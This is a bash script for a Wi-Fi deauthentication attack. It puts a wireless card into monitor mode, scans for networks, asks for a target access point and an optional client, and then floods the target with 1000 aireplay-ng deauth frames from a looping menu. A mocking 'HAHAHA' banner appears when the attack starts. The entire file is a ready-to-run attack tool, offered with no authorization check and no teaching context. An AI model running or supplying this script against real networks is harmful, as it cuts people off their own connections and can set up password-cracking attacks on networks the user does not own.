#!/bin/bash

# Check for root
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root."
  exit
fi

# Set interface
echo -n "Enter your wireless interface (e.g., wlan0): "
read iface

# Kill conflicting processes
echo "[*] Killing processes that might interfere..."
airmon-ng check kill

# Start monitor mode
airmon-ng start $iface
mon_iface="${iface}mon"

# Start scanning
echo "[*] Scanning for targets. Close airodump-ng when ready."
gnome-terminal -- bash -c "airodump-ng $mon_iface; exec bash"

# Get target info
echo -n "Enter target BSSID (e.g., 00:11:22:33:44:55): "
read bssid
echo -n "Enter target channel (e.g., 6): "
read channel

# Ask for specific client
echo -n "Enter target client MAC (leave blank for broadcast): "
read target_client

# Function to send deauth
send_deauth() {
  iwconfig $mon_iface channel $channel

  echo -e "\e[2J\e[H\e[1;32m"

  cat << "EOF"
██╗  ██╗ █████╗ ██╗  ██╗ █████╗ ██╗  ██╗ █████╗ ██╗  ██╗ █████╗ 
██║  ██║██╔══██╗██║  ██║██╔══██╗██║  ██║██╔══██╗██║  ██║██╔══██╗
███████║███████║███████║███████║███████║███████║███████║███████║
██╔══██║██╔══██║██╔══██║██╔══██║██╔══██║██╔══██║██╔══██║██╔══██║
██║  ██║██║  ██║██║  ██║██║  ██║██║  ██║██║  ██║██║  ██║██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
EOF

  echo -e "\e[0m"
  sleep 1
  echo -e "\e[5;32m[*] Initiating packet attack...\e[0m"

  if [[ -z "$target_client" ]]; then
    aireplay-ng --deauth 1000 -a $bssid $mon_iface
  else
    aireplay-ng --deauth 1000 -a $bssid -c $target_client $mon_iface
  fi
}

# Menu
while true; do
  clear
  echo "======== DEAUTH MENU ========"
  echo "1. Send Deauth Packets"
  echo "2. Change Target Info"
  echo "3. Exit"
  echo "============================="
  read -p "Choose an option: " opt

  case $opt in
    1) send_deauth ;;
    2) 
      echo -n "Enter new BSSID: "
      read bssid
      echo -n "Enter new Channel: "
      read channel
      echo -n "Enter new Client (blank for broadcast): "
      read target_client
      ;;
    3) echo "Goodbye."; airmon-ng stop $mon_iface; exit ;;
    *) echo "Invalid option." ;;
  esac

  read -p "Press Enter to return to menu..."
done
